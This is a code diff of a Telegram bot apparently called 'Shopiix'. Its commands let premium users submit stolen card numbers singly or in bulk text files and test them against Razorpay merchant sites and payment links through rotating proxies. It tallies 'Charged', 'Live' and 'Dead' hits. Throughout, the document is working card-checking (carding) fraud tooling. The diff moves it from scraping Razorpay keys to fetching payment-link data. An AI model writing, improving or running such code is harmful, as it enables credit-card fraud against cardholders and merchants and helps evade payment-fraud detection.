-            wait = await event.reply(
-                f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
-                f"<i>Fetching Razorpay key from site...</i>",
-                parse_mode='html'
-            )
-            proxies = load_proxies_fn(user_id)
-            proxy   = random.choice(proxies) if proxies else None
-            key     = await _scrape_rz_key(url, proxy)
+        proxies = load_proxies_fn(user_id)
+        proxy   = random.choice(proxies) if proxies else None
+        info    = await _get_site_data(url, proxy)
 
-        if key:
+        if info:
             _add_user_rz_site(user_id, url)
-            sites  = _get_user_rz_sites(user_id)
-            masked = key[:14] + '...' + key[-4:]
-            txt = (
+            sites = _get_user_rz_sites(user_id)
+            await wait.edit(
                 f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                 f"✅  <b>𝗦𝗜𝗧𝗘  𝗔𝗗𝗗𝗘𝗗</b>  ✅\n"
                 f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                 f"🌐 <b>𝗦𝗜𝗧𝗘</b>   ▸  <code>{url}</code>\n"
-                f"🔑 <b>𝗞𝗘𝗬</b>    ▸  <code>{masked}</code>\n"
+                f"🔑 <b>𝗣𝗟𝗜𝗡𝗞</b>  ▸  <code>{info['plink']}</code>\n"
                 f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>  ▸  {len(sites)} / {MAX_SITES} sites\n\n"
-                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'
+                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
+                parse_mode='html'
             )
-            if wait:
-                await wait.edit(txt, parse_mode='html')
-            else:
-                await event.reply(txt, parse_mode='html')
         else:
-            no_key_txt = (
+            await wait.edit(
                 f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
-                f"❌  <b>𝗡𝗢  𝗞𝗘𝗬  𝗙𝗢𝗨𝗡𝗗</b>  ❌\n"
+                f"❌  <b>𝗡𝗢  𝗗𝗔𝗧𝗔  𝗙𝗢𝗨𝗡𝗗</b>  ❌\n"
                 f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                 f"🌐 <b>𝗦𝗜𝗧𝗘</b>  ▸  <code>{url}</code>\n\n"
-                f"<i>Auto-detect failed. Provide key manually:</i>\n"
-                f"<code>/rzadd {url} rzp_live_xxx</code>\n\n"
-                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'
+                f"<i>Site se payment data nahi mila. Check karo URL sahi hai.</i>\n\n"
+                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
+                parse_mode='html'
             )
-            if wait:
-                await wait.edit(no_key_txt, parse_mode='html')
-            else:
-                await event.reply(no_key_txt, parse_mode='html')
 
     # ── /rzaddtxt ──────────────────────────────────────────────────────────────
     @bot.on(events.NewMessage(pattern=r'^/rzaddtxt(\s|$)'))
     async def rzaddtxt_handler(event):
         user_id = event.sender_id
         if not is_premium_fn(user_id):
-            await event.reply(
-                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
             return
 
         if not event.reply_to_msg_id:
-            await event.reply(
-                "❌ Reply to a <b>.txt</b> file containing site URLs with <code>/rzaddtxt</code>.",
-                parse_mode='html'
-            )
+            await event.reply("❌ Reply to a <b>.txt</b> file with <code>/rzaddtxt</code>.", parse_mode='html')
             return
 
         reply_msg = await event.get_reply_message()
-        if not reply_msg or not reply_msg.file or \
-                not (reply_msg.file.name or '').endswith('.txt'):
+        if not reply_msg or not reply_msg.file or not (reply_msg.file.name or '').endswith('.txt'):
             await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
             return
 
         wait = await event.reply(
-            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
-            "<i>Reading file and checking sites...</i>",
+            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<i>Reading file and checking sites...</i>",
             parse_mode='html'
         )
 
-        file_path = await reply_msg.download_media()
+        fp = await reply_msg.download_media()
         try:
-            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                 content = await f.read()
-            os.remove(file_path)
+            os.remove(fp)
         except Exception:
             await wait.edit("❌ Could not read file.", parse_mode='html')
             return
 
-        all_urls = re.findall(r'https?://\S+', content)
-        all_urls = list(dict.fromkeys([u.rstrip('/') for u in all_urls]))  # deduplicate
-
+        all_urls = list(dict.fromkeys([u.rstrip('/') for u in re.findall(r'https?://\S+', content)]))
         if not all_urls:
-            await wait.edit(
-                "❌ No URLs found in file.\n<i>Each line should be a full URL (https://...)</i>",
-                parse_mode='html'
-            )
+            await wait.edit("❌ No URLs found in file.", parse_mode='html')
             return
 
         proxies = load_proxies_fn(user_id)
-        added   = []
-        skipped = []
-        no_key  = []
+        added, skipped, failed = [], [], []
 
         for url in all_urls:
             url = _normalize_url(url)
             sites_now = _get_user_rz_sites(user_id)
-            if len(sites_now) >= MAX_SITES:
-                skipped.append(url)
-                continue
-            if url in sites_now:
+            if len(sites_now) >= MAX_SITES or url in sites_now:
                 skipped.append(url)
                 continue
             proxy = random.choice(proxies) if proxies else None
-            key   = await _scrape_rz_key(url, proxy)
-            if key:
+            info  = await _get_site_data(url, proxy)
+            if info:
                 _add_user_rz_site(user_id, url)
-                added.append((url, key))
+                added.append((url, info['plink']))
             else:
-                no_key.append(url)
+                failed.append(url)
 
-        total_now = len(_get_user_rz_sites(user_id))
-        added_lines = ''
-        for u, k in added[:10]:
-            masked = k[:14] + '...' + k[-4:]
-            added_lines += f"✅ <code>{u}</code>\n    🔑 <i>{masked}</i>\n"
-        if not added_lines:
-            added_lines = '<i>None added</i>'
-
-        skip_txt = f"\n⚠️ <b>Skipped</b>  ▸  {len(skipped)} (already added or limit reached)" if skipped else ''
-        nokey_txt = f"\n❌ <b>No key</b>  ▸  {len(no_key)} sites" if no_key else ''
+        total_now   = len(_get_user_rz_sites(user_id))
+        added_lines = ''.join(f"✅ <code>{u}</code>  <i>{p}</i>\n" for u, p in added[:10]) or '<i>None added</i>'
+        skip_txt    = f"\n⚠️ <b>Skipped</b>  ▸  {len(skipped)}" if skipped else ''
+        fail_txt    = f"\n❌ <b>Failed</b>   ▸  {len(failed)}" if failed else ''
 
         await wait.edit(
             f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
             f"✅  <b>𝗕𝗨𝗟𝗞  𝗔𝗗𝗗  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ✅\n"
             f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
-            f"📋 <b>𝗙𝗢𝗨𝗡𝗗</b>   ▸  {len(all_urls)} URLs in file\n"
+            f"📋 <b>𝗙𝗢𝗨𝗡𝗗</b>   ▸  {len(all_urls)} URLs\n"
             f"✅ <b>𝗔𝗗𝗗𝗘𝗗</b>   ▸  {len(added)}\n"
-            f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>   ▸  {total_now} / {MAX_SITES} sites\n"
-            f"{skip_txt}{nokey_txt}\n\n"
-            f"〔 ✅  A D D E D  S I T E S 〕\n"
-            f"<blockquote>{added_lines}</blockquote>\n\n"
+            f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>   ▸  {total_now} / {MAX_SITES}{skip_txt}{fail_txt}\n\n"
+            f"〔 ✅  A D D E D 〕\n<blockquote>{added_lines}</blockquote>\n\n"
             f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
             parse_mode='html'
         )
@@ -726,22 +545,15 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
     async def rzlist_handler(event):
         user_id = event.sender_id
         if not is_premium_fn(user_id):
-            await event.reply(
-                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
             return
         sites = _get_user_rz_sites(user_id)
         if not sites:
-            await event.reply(
-                "❌ <b>No sites configured.</b>\n\n"
-                "Use <code>/rzadd https://yoursite.com</code>",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>No sites configured.</b>\n\nUse <code>/rzadd https://razorpay.me/@handle</code>", parse_mode='html')
             return
         lines = '\n'.join(
             f"<b>{i+1}.</b>  <code>{s}</code>"
-            + (f"\n      🔑 <i>{_rz_key_cache[s][:14]}...</i>" if s in _rz_key_cache else "")
+            + (f"\n      🔑 <i>{_rz_data_cache[s]['plink']}</i>" if s in _rz_data_cache else "")
             for i, s in enumerate(sites)
         )
         await event.reply(
@@ -759,82 +571,44 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
     async def rzrem_handler(event):
         user_id = event.sender_id
         if not is_premium_fn(user_id):
-            await event.reply(
-                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
             return
         parts = event.raw_text.split(maxsplit=1)
         if len(parts) < 2 or not parts[1].strip().isdigit():
-            await event.reply(
-                "❌ <b>Usage:</b> <code>/rzrem &lt;number&gt;</code>\n\n"
-                "Use <code>/rzlist</code> to see site numbers.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>Usage:</b> <code>/rzrem &lt;number&gt;</code>", parse_mode='html')
             return
-        idx     = int(parts[1].strip()) - 1
-        removed = _remove_user_rz_site(user_id, idx)
+        removed = _remove_user_rz_site(user_id, int(parts[1].strip()) - 1)
         if removed:
-            await event.reply(
-                f"🗑  <b>𝗦𝗜𝗧𝗘  𝗥𝗘𝗠𝗢𝗩𝗘𝗗</b>\n\n"
-                f"🌐 <code>{removed}</code>",
-                parse_mode='html'
-            )
+            await event.reply(f"🗑  <b>𝗦𝗜𝗧𝗘  𝗥𝗘𝗠𝗢𝗩𝗘𝗗</b>\n\n🌐 <code>{removed}</code>", parse_mode='html')
         else:
-            await event.reply(
-                "❌ Invalid number. Use <code>/rzlist</code> to check.",
-                parse_mode='html'
-            )
+            await event.reply("❌ Invalid number. Use <code>/rzlist</code> to check.", parse_mode='html')
 
     # ── /rz ────────────────────────────────────────────────────────────────────
     @bot.on(events.NewMessage(pattern=r'^/rz(\s|$)'))
     async def rz_handler(event):
         user_id = event.sender_id
         if not is_premium_fn(user_id):
-            await event.reply(
-                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
             return
 
         sites = _get_user_rz_sites(user_id)
         if not sites:
-            await event.reply(
-                "❌ <b>No Razorpay site set.</b>\n\n"
-                "Use <code>/rzadd https://yoursite.com</code> first.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>No site set.</b>\n\nUse <code>/rzadd https://razorpay.me/@handle</code>", parse_mode='html')
             return
 
         parts = event.raw_text.split(maxsplit=1)
-        if len(parts) < 2:
-            await event.reply(
-                "❌ <b>Usage:</b> <code>/rz cc|mm|yy|cvv</code>",
-                parse_mode='html'
-            )
+        if len(parts) < 2 or parts[1].strip().count('|') != 3:
+            await event.reply("❌ <b>Usage:</b> <code>/rz cc|mm|yy|cvv</code>", parse_mode='html')
             return
 
-        card = parts[1].strip()
-        if card.count('|') != 3:
-            await event.reply(
-                "❌ Invalid CC format. Use: <code>/rz 4111111111111111|01|25|123</code>",
-                parse_mode='html'
-            )
-            return
-
+        card    = parts[1].strip()
         site    = random.choice(sites)
         proxies = load_proxies_fn(user_id)
         proxy   = random.choice(proxies) if proxies else None
 
-        key = _rz_key_cache.get(site)
-        if not key:
-            key = await _scrape_rz_key(site, proxy)
-        if not key:
-            await event.reply(
-                f"❌ No Razorpay key on <code>{site}</code>.\n"
-                f"Remove it with <code>/rzrem</code> and add a working site.",
-                parse_mode='html'
-            )
+        info = _rz_data_cache.get(site) or await _get_site_data(site, proxy)
+        if not info:
+            await event.reply(f"❌ Cannot fetch data from <code>{site}</code>.\nTry <code>/rzrem</code> and add again.", parse_mode='html')
             return
 
         status_msg = await event.reply(
@@ -842,7 +616,7 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             parse_mode='html'
         )
         t0     = time.time()
-        result = await razorpay_check(card, site, key, proxy_str=proxy)
+        result = await razorpay_check(card, site, info, proxy_str=proxy)
         elapsed = round(time.time() - t0, 2)
 
         status  = result['status']
@@ -874,57 +648,41 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
     async def rztxt_handler(event):
         user_id = event.sender_id
         if not is_premium_fn(user_id):
-            await event.reply(
-                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
             return
 
         sites = _get_user_rz_sites(user_id)
         if not sites:
-            await event.reply(
-                "❌ <b>No Razorpay site set.</b>\n\n"
-                "Use <code>/rzadd https://yoursite.com</code> first.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>No site set.</b>\n\nUse <code>/rzadd https://razorpay.me/@handle</code>", parse_mode='html')
             return
 
         if not event.reply_to_msg_id:
-            await event.reply(
-                "❌ Reply to a <b>.txt</b> file with <code>/rztxt</code>.",
-                parse_mode='html'
-            )
+            await event.reply("❌ Reply to a <b>.txt</b> file with <code>/rztxt</code>.", parse_mode='html')
             return
 
         reply_msg = await event.get_reply_message()
-        if not reply_msg or not reply_msg.file or \
-                not (reply_msg.file.name or '').endswith('.txt'):
+        if not reply_msg or not reply_msg.file or not (reply_msg.file.name or '').endswith('.txt'):
             await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
             return
 
-        # Pre-warm key cache for all sites
+        # Pre-warm data cache
         proxies = load_proxies_fn(user_id)
         for _s in list(sites):
-            if _s not in _rz_key_cache:
-                _proxy = random.choice(proxies) if proxies else None
-                await _scrape_rz_key(_s, _proxy)
+            if _s not in _rz_data_cache:
+                _p = random.choice(proxies) if proxies else None
+                await _get_site_data(_s, _p)
 
-        valid_sites = [s for s in sites if s in _rz_key_cache]
+        valid_sites = [s for s in sites if s in _rz_data_cache]
         if not valid_sites:
-            await event.reply(
-                "❌ No Razorpay key found on any of your sites.\n"
-                "Reconfigure with <code>/rzadd</code>.",
-                parse_mode='html'
-            )
+            await event.reply("❌ No valid sites. Reconfigure with <code>/rzadd</code>.", parse_mode='html')
             return
 
-        wait_msg  = await event.reply("⏳ Reading file...", parse_mode='html')
-        file_path = await reply_msg.download_media()
+        wait_msg = await event.reply("⏳ Reading file...", parse_mode='html')
+        fp = await reply_msg.download_media()
         try:
-            async with aiofiles.open(file_path, 'r',
-                    encoding='utf-8', errors='ignore') as f:
+            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                 content = await f.read()
-            os.remove(file_path)
+            os.remove(fp)
         except Exception:
             await wait_msg.edit("❌ Could not read file.", parse_mode='html')
             return
@@ -936,18 +694,18 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
         if not is_owner_fn(user_id) and len(cards) > MAX_CARDS:
             cards = cards[:MAX_CARDS]
 
-        total    = len(cards)
-        chat_id  = event.chat_id
-        results  = {'charged': [], 'live': [], 'dead': [], 'error': 0, 'start': time.time()}
-        _stop    = [False]
+        total   = len(cards)
+        chat_id = event.chat_id
+        results = {'charged': [], 'live': [], 'dead': [], 'error': 0, 'start': time.time()}
+        _stop   = [False]
 
         await wait_msg.edit(
             f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
-            f"💳 <b>{total}</b> cards loaded — Starting Razorpay...",
+            f"💳 <b>{total}</b> cards — Starting Razorpay Charge...",
             parse_mode='html'
         )
         prog_msg = await event.respond(
-            f"⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
+            "⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
             parse_mode='html'
         )
 
@@ -966,25 +724,25 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             m_t, s_t = divmod(rem, 60)
             if last_card:
                 num    = last_card.split('|')[0]
-                masked = num[:6] + '*' * max(0, len(num) - 10) + num[-4:] if len(num) > 10 else num
+                masked = num[:6] + '*' * max(0, len(num)-10) + num[-4:] if len(num) > 10 else num
             else:
                 masked = '—'
             resp_short = (last_resp[:26] + '...') if len(last_resp) > 28 else (last_resp or '—')
             buttons = [
-                [Button.inline(f"💳  Card  →  {masked}",                              b"noop")],
-                [Button.inline(f"📝  Response  →  {resp_short}",                      b"noop")],
-                [Button.inline(f"💎  Charged  →  [ {len(results['charged'])} ]",      b"noop")],
-                [Button.inline(f"🔥  Approve  →  [ {len(results['live'])} ]",         b"noop")],
-                [Button.inline(f"❌  Decline  →  [ {len(results['dead'])} ]",         b"noop")],
-                [Button.inline(f"⚠️  Errors   →  [ {results['error']} ]",             b"noop")],
-                [Button.inline(f"✅  Progress  →  [ {checked} / {total} ]",           b"noop")],
-                [Button.inline(f"⏱  Time  →  {h}h {m_t}m {s_t}s",                   b"noop")],
+                [Button.inline(f"💳  Card  →  {masked}",                         b"noop")],
+                [Button.inline(f"📝  Response  →  {resp_short}",                  b"noop")],
+                [Button.inline(f"💎  Charged  →  [ {len(results['charged'])} ]",  b"noop")],
+                [Button.inline(f"🔥  Approve  →  [ {len(results['live'])} ]",     b"noop")],
+                [Button.inline(f"❌  Decline  →  [ {len(results['dead'])} ]",     b"noop")],
+                [Button.inline(f"⚠️  Errors   →  [ {results['error']} ]",         b"noop")],
+                [Button.inline(f"✅  Progress  →  [ {checked} / {total} ]",       b"noop")],
+                [Button.inline(f"⏱  Time  →  {h}h {m_t}m {s_t}s",               b"noop")],
                 [Button.inline("⛔  Stop", stop_key)],
             ]
             try:
                 await bot.edit_message(
                     chat_id, prog_msg.id,
-                    f"⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
+                    "⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
                     buttons=buttons, parse_mode='html'
                 )
             except Exception:
@@ -994,30 +752,24 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
         checked_count = [0]
 
         async def _check_one(card, idx):
-            if _stop[0]:
-                return
+            if _stop[0]: return
             async with semaphore:
-                if _stop[0]:
-                    return
+                if _stop[0]: return
                 site  = random.choice(valid_sites)
-                key   = _rz_key_cache[site]
+                info  = _rz_data_cache[site]
                 proxy = random.choice(proxies) if proxies else None
-                res   = await razorpay_check(card, site, key, proxy_str=proxy)
+                res   = await razorpay_check(card, site, info, proxy_str=proxy)
                 st    = res['status']
                 msg   = res['message']
-                if st == 'Charged':
-                    results['charged'].append(res)
-                elif st == 'Live':
-                    results['live'].append(res)
-                elif st == 'Error':
-                    results['error'] += 1
-                else:
-                    results['dead'].append(res)
+                if st == 'Charged': results['charged'].append(res)
+                elif st == 'Live':  results['live'].append(res)
+                elif st == 'Error': results['error'] += 1
+                else:               results['dead'].append(res)
                 checked_count[0] += 1
                 if checked_count[0] % 5 == 0 or checked_count[0] == total:
                     await _update_prog(checked_count[0], card, msg)
 
-        await asyncio.gather(*[_check_one(c, i + 1) for i, c in enumerate(cards)])
+        await asyncio.gather(*[_check_one(c, i+1) for i, c in enumerate(cards)])
         bot.remove_event_handler(_stop_handler)
 
         elapsed  = int(time.time() - results['start'])
@@ -1043,8 +795,7 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             f"⚠️ <b>𝗘𝗥𝗥𝗢𝗥𝗦</b>   ▸  <code>{results['error']}</code>\n"
             f"🌐 <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬</b>  ▸  Razorpay Charge\n"
             f"⏱  <b>𝗧𝗜𝗠𝗘</b>    ▸  {h}h {m_t}m {s_t}s\n\n"
-            f"〔 🎯  H I T S 〕\n"
-            f"<blockquote>{hits_txt}</blockquote>\n\n"
+            f"〔 🎯  H I T S 〕\n<blockquote>{hits_txt}</blockquote>\n\n"
             f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'
         )
         try:
